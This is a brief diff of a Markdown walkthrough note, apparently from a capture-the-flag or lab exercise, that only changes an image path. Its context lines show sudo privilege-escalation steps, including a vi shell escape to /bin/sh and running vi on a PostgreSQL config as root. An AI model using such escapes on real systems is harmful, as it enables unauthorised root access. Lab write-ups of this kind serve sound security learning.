@@ -14,7 +14,7 @@ If the binary is allowed to run as superuser by sudo, it does not drop the eleva
 
 sudo vi -c ':!/bin/sh' /dev/null
 ```
-![[Pasted image 20220612124132.png]]
+![[Assets/Pasted image 20220612124132.png]]
 But this DOES NOT work so lets execute the other command that can be run using sudo
 ```bash
 sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
